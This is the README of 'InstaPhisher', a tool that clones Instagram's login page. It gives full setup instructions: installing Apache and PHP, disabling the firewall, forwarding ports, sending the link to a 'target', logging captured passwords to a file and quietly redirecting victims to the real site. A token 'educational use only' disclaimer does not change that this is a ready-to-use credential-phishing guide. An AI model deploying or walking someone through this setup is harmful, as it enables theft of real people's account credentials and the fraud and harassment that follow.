# InstaPhisher - 2020

__author__ Exilas <br/>
__version__ 1.0.0


# Disclamer

I am in no way responsible for illegal uses. For educational use only.


# Information

This site is a clone of the 2020 instagram login page. You need to have and configure a DNS (you can get a free one here: https://www.freenom.com/fr). You must also have a valid apache version (https://httpd.apache.org/download.cgi) and php (https://www.php.net/downloads).

Then, move all InstaPhisher files to the apache folder ("/var/www/html" for linux). Make sure to disable your firewall and redirect the port 80 (UDP/TCP) on your router to your machine. If you use Linux, you must grant read and write permissions to the files InstaPhisher.py, login.php and logs.txt when it will be created. After, use python in a terminal and start the file InstaPhisher.py. Send your DNS url to your target and wait. Please do not modify the logs.txt file during this step. When your victim logs on, you'll be notified via terminal. The passwords will be saved in the logs.txt file.

You can modify the redirect link in the login.php file. Enter url in header() function, after 'Location: ' at line 19. The default redirection is https://www.instagram.com.

Exemple:
-   header("Location: https://www.instagram.com");
-   header("Location: <redirection_url>");

You can also obtain SSL certificates with Let's Encrypt to benefit from an https connection. In this case you will have to redirect ports 80 and 443 (UDP/TCP) of your router to your machine.

The InstaPhisher file is only used to notify you when a new password is captured. It is therefore not necessary to open it, but recommended.


# Install

Linux
-----

```
git clone https://github.com/ExilasP/InstaPhisher.git
cd InstaPhisher
cp * -r '/var/www/html'
cd /var/www/html
touch logs.txt
sudo chmod +777 login.php && sudo chmod +777 InstaPhisher.py && chmod +777 logs.txt
service apache2 start
python InstaPhisher.py
```

Windwos
-------

## Apache and Php download and configuration

video tutorial: https://www.youtube.com/watch?v=vb0vQYoeWt0

1. Download apache-2.4
```
Powershell.exe Invoke-WebRequest -Uri "https://www.apachelounge.com/download/VS16/binaries/httpd-2.4.43-win64-VS16.zip" -OutFile "%userprofile%\Download\httpd-2.4.43-win64-VS16.zip"
```

2. Download Visual C++ (required for apache)
```
Powershell.exe Invoke-WebRequest -Uri "https://aka.ms/vs/16/release/VC_redist.x64.exe" -OutFile "%userprofile%\Download\VC_redist.x64.exe"
start %userprofile%\Download\VC_redist.x64.exe
```

3. Extract archive
```
Powershell.exe Compress-Archive -Path "%userprofile%\Download\httpd-2.4.43-win64-VS16.zip" -DestinationPath "%userprofile%\Download\httpd-2.4.43-win64-VS16"
```

4. Move apache24 folder to C:\apache24
```
cd %userprofile%\Download\httpd-2.4.43-win64-VS16
move /Y %userprofile%\Download\httpd-2.4.43-win64-VS16\Apache24 C:\Apache24
```

5. You must modify Apache24\conf\httpd.conf
-	Open C:/Apache24/httpd.conf with notepad
-	line 162: replace "#LoadModule rewrite_module modules/mod_rewrite.so" to "LoadModule rewrite_module modules/mod_rewrite.so"
-	Open CMD in Administrator Mode
-	Use the Command "cd /Apache24/bin"
-	Use the Command "httpd -k install"

6. Download php Thread Safe
```
Powershell.exe Invoke-WebRequest -Uri "https://windows.php.net/downloads/qa/php-7.4.5RC1-Win32-vc15-x64.zip" -OutFile "%userprofile%\Download\php-7.4.5RC1-Win32-vc15-x64.zip"
```

7. Extract archive
```
Powershell.exe Compress-Archive -Path "%userprofile%\Download\php-7.4.5RC1-Win32-vc15-x64.zip" -DestinationPath "%userprofile%\Download\php"
```

8. Move all file in php-7.4.5RC1-Win32-vc15-x64 folder to C:\php
```
move /Y %userprofile%\Download\php C:\
```

9. Rename C:/php/php.ini-development to C:/php/php.ini
```
rename C:\php\php.ini-development C:\php\php.ini
```

10. Open C:/Apache24/httpd.conf
-	Add the Following Lines:
```
PHPIniDir "C:/php"
LoadModule php7_module "C:/php/php7apache2_4.dll"
AddHandler application/x-httpd-php .php
```

## InstaPhisher download

1. Download InstaPhisher and extract 
```
Powershell.exe Invoke-WebRequest -Uri "https://github.com/ExilasP/InstaPhisher/archive/master.zip" -OutFile "%userprofile%\Download\InstaPhisher.zip"
Powershell.exe Compress-Archive -Path "%userprofile%\Download\InstaPhisher.zip" -DestinationPath "%userprofile%\Download\InstaPhisher"
move /Y %userprofile%\Download\InstaPhisher\* C:\Apache24\htdocs
```

# Notice

### Requirements

-   Python : https://www.python.org/downloads/
-   Apache : https://httpd.apache.org/download.cgi
-   Php    : https://www.php.net/downloads
-   DNS    : https://www.freenom.com/
-   Linux, Windows or MacOS (simpler with linux)

### Usage

Linux:
```
service apache2 start   #"service apache2 stop" for stop 
python InstaPhisher.py  #Not required but recommended
```

When your target has entered his password, you will receive a message and a sound notification:
```
[+] New password hacked - <UserTarget>
```

Windows:

With admin cmd:
```
cd C:\Apache24\bin
httpd -k start          #"httpd -k stop" for stop
```
